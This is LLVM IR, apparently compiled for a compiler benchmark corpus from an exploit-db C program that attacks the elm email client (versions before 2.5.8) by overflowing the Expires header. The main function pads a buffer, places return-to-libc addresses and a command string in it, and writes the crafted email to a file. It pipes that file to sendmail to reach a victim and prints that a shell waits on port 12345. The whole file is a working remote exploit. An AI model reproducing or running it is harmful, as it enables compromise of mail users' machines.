; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1171.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1171.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFFER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"Usage: ./elmex <user@where.com>\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [35 x i8] c"[-] Sorry, email address too long!\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@EMAIL = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [64 x i8] c"\0AExploit for elm email client < 2.5.8 overflow in Expires field\00", align 1
@.str.4 = private unnamed_addr constant [65 x i8] c"Tested: Redhat on quiet a Sunday by c0ntex[at]open-security.org\0A\00", align 1
@EXTLOC = common dso_local global i64 0, align 8
@SYSLOC = common dso_local global i64 0, align 8
@STRLOC = common dso_local global i64 0, align 8
@expire = common dso_local global i8* null, align 8
@STRING = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [35 x i8] c"[-] Adding exploit buffer to email\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"fopen\00", align 1
@.str.8 = private unnamed_addr constant [166 x i8] c"From: User c0ntex <c0ntex@open-security.org> Sun Aug 21 13:37:00 2005\0AReturn-Path: <c0ntex@localhost\0ADate: Sun, 21 Aug 2005 13:37:00 %s\0ASubject: Insecure?\0ATo: %s\0A%s\0A\00", align 1
@.str.9 = private unnamed_addr constant [40 x i8] c"[-] Emailing %s with malicious content\0A\00", align 1
@.str.10 = private unnamed_addr constant [43 x i8] c"/bin/cat ./tmpmail | /usr/sbin/sendmail -t\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.12 = private unnamed_addr constant [55 x i8] c"[-] Connect to system on port 12345 to get your shell\0A\00", align 1
@.str.13 = private unnamed_addr constant [7 x i8] c"unlink\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @BUFFER, align 4
  %16 = zext i32 %15 to i64
  %17 = call i8* @llvm.stacksave()
  store i8* %17, i8** %6, align 8
  %18 = alloca i8, i64 %16, align 16
  store i64 %16, i64* %7, align 8
  store i8* null, i8** %8, align 8
  store i8* null, i8** %9, align 8
  %19 = load i32, i32* %4, align 4
  %20 = icmp ne i32 %19, 2
  br i1 %20, label %21, label %25

21:                                               ; preds = %2
  %22 = call i32 @puts(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %23 = load i32, i32* @EXIT_FAILURE, align 4
  %24 = call i32 @exit(i32 %23) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = icmp sgt i32 %29, 50
  br i1 %30, label %31, label %35

31:                                               ; preds = %25
  %32 = call i32 @puts(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32, i32* @EXIT_FAILURE, align 4
  %34 = call i32 @exit(i32 %33) #4
  unreachable

35:                                               ; preds = %25
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 1
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = call i64 @malloc(i32 %39)
  %41 = inttoptr i64 %40 to i8*
  store i8* %41, i8** %9, align 8
  %42 = load i8*, i8** %9, align 8
  %43 = icmp ne i8* %42, null
  br i1 %43, label %48, label %44

44:                                               ; preds = %35
  %45 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #4
  unreachable

48:                                               ; preds = %35
  %49 = load i8*, i8** @EMAIL, align 8
  store i8* %49, i8** %8, align 8
  %50 = load i8*, i8** %9, align 8
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = call i32 @memset(i8* %50, i8 signext 0, i32 %54)
  %56 = load i8*, i8** %9, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @strlen(i8* %62)
  %64 = call i32 @memcpy(i8* %56, i8* %59, i32 %63)
  %65 = call i32 @puts(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.3, i64 0, i64 0))
  %66 = call i32 @puts(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.4, i64 0, i64 0))
  %67 = load i64, i64* @EXTLOC, align 8
  store i64 %67, i64* %11, align 8
  %68 = load i64, i64* @SYSLOC, align 8
  store i64 %68, i64* %12, align 8
  %69 = load i64, i64* @STRLOC, align 8
  store i64 %69, i64* %13, align 8
  %70 = load i32, i32* @BUFFER, align 4
  %71 = call i32 @memset(i8* %18, i8 signext 0, i32 %70)
  %72 = load i8*, i8** @expire, align 8
  %73 = load i8*, i8** @expire, align 8
  %74 = call i32 @strlen(i8* %73)
  %75 = call i32 @memcpy(i8* %18, i8* %72, i32 %74)
  %76 = load i8*, i8** @expire, align 8
  %77 = call i32 @strlen(i8* %76)
  store i32 %77, i32* %10, align 4
  br label %78

78:                                               ; preds = %85, %48
  %79 = load i32, i32* %10, align 4
  %80 = icmp slt i32 %79, 53
  br i1 %80, label %81, label %88

81:                                               ; preds = %78
  %82 = load i32, i32* %10, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %18, i64 %83
  store i8 65, i8* %84, align 1
  br label %85

85:                                               ; preds = %81
  %86 = load i32, i32* %10, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %10, align 4
  br label %78

88:                                               ; preds = %78
  store i32 53, i32* %10, align 4
  br label %89

89:                                               ; preds = %98, %88
  %90 = load i32, i32* %10, align 4
  %91 = icmp slt i32 %90, 57
  br i1 %91, label %92, label %101

92:                                               ; preds = %89
  %93 = load i64, i64* %12, align 8
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %18, i64 %95
  %97 = bitcast i8* %96 to i64*
  store i64 %93, i64* %97, align 1
  br label %98

98:                                               ; preds = %92
  %99 = load i32, i32* %10, align 4
  %100 = add nsw i32 %99, 4
  store i32 %100, i32* %10, align 4
  br label %89

101:                                              ; preds = %89
  store i32 57, i32* %10, align 4
  br label %102

102:                                              ; preds = %111, %101
  %103 = load i32, i32* %10, align 4
  %104 = icmp slt i32 %103, 61
  br i1 %104, label %105, label %114

105:                                              ; preds = %102
  %106 = load i64, i64* %11, align 8
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %18, i64 %108
  %110 = bitcast i8* %109 to i64*
  store i64 %106, i64* %110, align 1
  br label %111

111:                                              ; preds = %105
  %112 = load i32, i32* %10, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %10, align 4
  br label %102

114:                                              ; preds = %102
  store i32 61, i32* %10, align 4
  br label %115

115:                                              ; preds = %124, %114
  %116 = load i32, i32* %10, align 4
  %117 = icmp slt i32 %116, 65
  br i1 %117, label %118, label %127

118:                                              ; preds = %115
  %119 = load i64, i64* %13, align 8
  %120 = load i32, i32* %10, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %18, i64 %121
  %123 = bitcast i8* %122 to i64*
  store i64 %119, i64* %123, align 1
  br label %124

124:                                              ; preds = %118
  %125 = load i32, i32* %10, align 4
  %126 = add nsw i32 %125, 4
  store i32 %126, i32* %10, align 4
  br label %115

127:                                              ; preds = %115
  %128 = getelementptr inbounds i8, i8* %18, i64 65
  %129 = load i8*, i8** @STRING, align 8
  %130 = load i8*, i8** @STRING, align 8
  %131 = call i32 @strlen(i8* %130)
  %132 = call i32 @memcpy(i8* %128, i8* %129, i32 %131)
  %133 = load i32, i32* @BUFFER, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %18, i64 %134
  store i8 0, i8* %135, align 1
  %136 = call i32 @puts(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0))
  %137 = load i8*, i8** %8, align 8
  %138 = call i32* @fopen(i8* %137, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  store i32* %138, i32** %14, align 8
  %139 = load i32*, i32** %14, align 8
  %140 = icmp ne i32* %139, null
  br i1 %140, label %147, label %141

141:                                              ; preds = %127
  %142 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %143 = load i8*, i8** %9, align 8
  %144 = call i32 @free(i8* %143)
  %145 = load i32, i32* @EXIT_FAILURE, align 4
  %146 = call i32 @exit(i32 %145) #4
  unreachable

147:                                              ; preds = %127
  %148 = load i32*, i32** %14, align 8
  %149 = load i8*, i8** @STRING, align 8
  %150 = load i8*, i8** %9, align 8
  %151 = call i32 @fprintf(i32* %148, i8* getelementptr inbounds ([166 x i8], [166 x i8]* @.str.8, i64 0, i64 0), i8* %149, i8* %150, i8* %18)
  %152 = load i32*, i32** %14, align 8
  %153 = call i32 @fclose(i32* %152)
  %154 = load i8**, i8*** %5, align 8
  %155 = getelementptr inbounds i8*, i8** %154, i64 1
  %156 = load i8*, i8** %155, align 8
  %157 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.9, i64 0, i64 0), i8* %156)
  %158 = call i64 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.10, i64 0, i64 0))
  %159 = icmp slt i64 %158, 0
  br i1 %159, label %160, label %166

160:                                              ; preds = %147
  %161 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i64 0, i64 0))
  %162 = load i8*, i8** %9, align 8
  %163 = call i32 @free(i8* %162)
  %164 = load i32, i32* @EXIT_FAILURE, align 4
  %165 = call i32 @exit(i32 %164) #4
  unreachable

166:                                              ; preds = %147
  %167 = call i32 @puts(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.12, i64 0, i64 0))
  %168 = load i8*, i8** @EMAIL, align 8
  %169 = call i64 @unlink(i8* %168)
  %170 = icmp slt i64 %169, 0
  br i1 %170, label %171, label %173

171:                                              ; preds = %166
  %172 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.13, i64 0, i64 0))
  br label %173

173:                                              ; preds = %171, %166
  %174 = load i8*, i8** %9, align 8
  %175 = call i32 @free(i8* %174)
  %176 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %176, i32* %3, align 4
  %177 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %177)
  %178 = load i32, i32* %3, align 4
  ret i32 %178
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @puts(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32* @fopen(i8*, i8*) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @fprintf(i32*, i8*, i8*, i8*, i8*) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @printf(i8*, i8*) #2

declare dso_local i64 @system(i8*) #2

declare dso_local i64 @unlink(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
